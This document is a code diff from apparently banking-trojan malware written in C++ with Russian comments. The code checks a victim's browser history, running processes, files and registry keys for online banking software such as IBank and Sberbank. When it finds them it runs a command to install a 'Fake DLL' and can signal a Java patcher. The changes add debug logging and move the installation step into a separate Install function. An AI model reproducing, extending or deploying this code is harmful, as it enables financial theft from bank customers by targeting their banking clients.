@@ -22,6 +22,16 @@
 #include "Utils.h"
 
 
+#include "BotDebug.h"
+
+namespace FKI_DEBUGER
+{
+    #include "DbgTemplates.h"
+}
+
+#define FKIDBG  FKI_DEBUGER::DBGOutMessage<>
+
+
 
 
 //-----------------------------------------------------------
@@ -577,7 +587,7 @@ void HisAnalizer::StartAnalizerThread(PCHAR URL)
 //   Методы поиска следов на компьютере с целью проверки необходимости
 //   установки Fake DLL
 //*****************************************************************************
-namespace FKI
+namespace FDI
 {
 	//--------------------------------------------------
 	//  Функция загружает список обрабатываемых ссылок
@@ -604,6 +614,7 @@ namespace FKI
 	void CheckIEHistory(PFindData Find, PCHAR FileName, LPVOID SearchData, bool &Cancel)
 	{
 		// Ищем вхождение ссылок в найденном файле истории
+
 		TSearchData* Data = (TSearchData*)SearchData;
 
 		DWORD  Size = 0;
@@ -619,6 +630,7 @@ namespace FKI
 				{
 					Cancel = true;
 					Data->Contain = true;
+					FKIDBG("FakeDLLInstaller", "Надена нужная ссылка в истории навигации [%s]", Link.t_str());
 					break;
 				}
 			}
@@ -635,6 +647,7 @@ namespace FKI
 	{
 		if (Links.Count())
 		{
+			FKIDBG("FakeDLLInstaller", "Проверяем историю навигации ИЕ");
 			string Path = GetSpecialFolderPathA(CSIDL_HISTORY, NULL);
 			if (!Path.IsEmpty())
 			{
@@ -675,6 +688,7 @@ namespace FKI
 	bool SearchProcesses()
 	{
 		// Функция проверяет запущенные процессы в поиске нужных
+		FKIDBG("FakeDLLInstaller", "Проверяем запущенные процессы");
 
 		bool Result = false;
 		LPVOID Buf = GetInfoTable( SystemProcessInformation );
@@ -696,6 +710,7 @@ namespace FKI
 
 						if (CheckFileHash(ProcessHash))
 						{
+							FKIDBG("FakeDLLInstaller", "Найден процесс %s", pProcess->usName.Buffer);
 							Result = true;
 							break;
 						}
@@ -716,14 +731,39 @@ namespace FKI
 
 	bool IBankInstalled()
 	{
-		// Функция проверяет наличие ключей реестра
+		// Функция проверяет наличие наличие файла или ключей реестра
 		//  сигнализирующих об установленном,
 		// на машине пользователя IBank
-		string Tmp = GetStr(EStrSberRegistryKey);
+        FKIDBG("FakeDLLInstaller", "Проверяем инсталяцию банков");
 
-		bool Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
+		// Проверяем наличие файла
+		string FileNameName = GetSpecialFolderPathA(CSIDL_PROFILE, GetStr(EStrIBankFileName));
+
+		bool Result = File::IsExists(FileNameName.t_str());
+
+
+
+
+		if (!Result)
+		{
+			// Проверяем реестр
+
+			FKIDBG("FakeDLLInstaller", "Проверяем ключи реестра");
+			string Tmp = GetStr(EStrSberRegistryKey);
+
+			Result = Registry::IsKeyExist(HKEY_LOCAL_MACHINE, GetStr(EStrIBankRegistryPath).t_str()) ||
 					  Registry::IsKeyExist(HKEY_LOCAL_MACHINE, Tmp.t_str()) ||
 					  Registry::IsKeyExist(HKEY_CURRENT_USER,  Tmp.t_str());
+        }
+
+		if (Result)
+		{
+			FKIDBG("FakeDLLInstaller", "Найдено присутствие ИБанка");
+			// При включенном фва патчере запускаем установку
+			#ifdef JAVS_PATCHERHvd
+				JavaPatcherSignal(NULL);
+			#endif
+		}
 
 		return Result;
 
@@ -736,6 +776,7 @@ namespace FKI
 		DWORD Hash = STRA::Hash(Find->cFileName, 0, true);
 		if (CheckFileHash(Hash))
 		{
+			FKIDBG("FakeDLLInstaller", "Найден файл %s", FileName);
 			Cancel = true;
             *((bool*)SearchData) = true;
 		}
@@ -746,6 +787,7 @@ namespace FKI
 	bool CheckFiles()
 	{
 		// Функция ищет вхождение нужных файлов
+		FKIDBG("FakeDLLInstaller", "Проверяем файлы на диске");
 		TMemory Path(MAX_PATH);
 
 		pGetSystemDirectoryA(Path.AsStr(), MAX_PATH);
@@ -769,6 +811,8 @@ namespace FKI
 		// ключей реестра сигнализирующих об установленном,
 		// на машине пользователя IBank
 
+        FKIDBG("FakeDLLInstaller", "Определяем необхдимость установки FakeDll");
+
 		bool Executed = IBankInstalled() ||
 						SearchProcesses() ||
 						CheckFiles();
@@ -789,10 +833,7 @@ namespace FKI
 		// В случае обнаружения вхождений, выполняем команду
 		if (Executed)
 		{
-			#ifndef AGENTFULLTEST
-				ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
-									 GetStr(EStrFakeDllInstallerCommandParams).t_str(), false);
-			#endif
+        	Install();
         }
 
 		return 0;
@@ -802,15 +843,27 @@ namespace FKI
 
 
 
-
 //------------------------------------------------------
 // Execute - Фуекция запускает анализ истории навигации
 //------------------------------------------------------
-void FKI::Execute()
+void FDI::Execute()
 {
 	StartThread(DoExecute, 0);
 }
 
+
+
+//------------------------------------------------------
+//  Функция запускает установку Fake DLL
+//------------------------------------------------------
+void FDI::Install()
+{
+	FKIDBG("FakeDLLInstaller", "Устанавливаем Fake DLL");
+	#ifndef AGENTFULLTEST
+		ExecuteCommand(NULL, GetStr(CommandInstallFakeDLL).t_str(),
+							 GetStr(EStrFakeDllInstallerCommandParams).t_str(), false);
+	#endif
+}
 
 
 
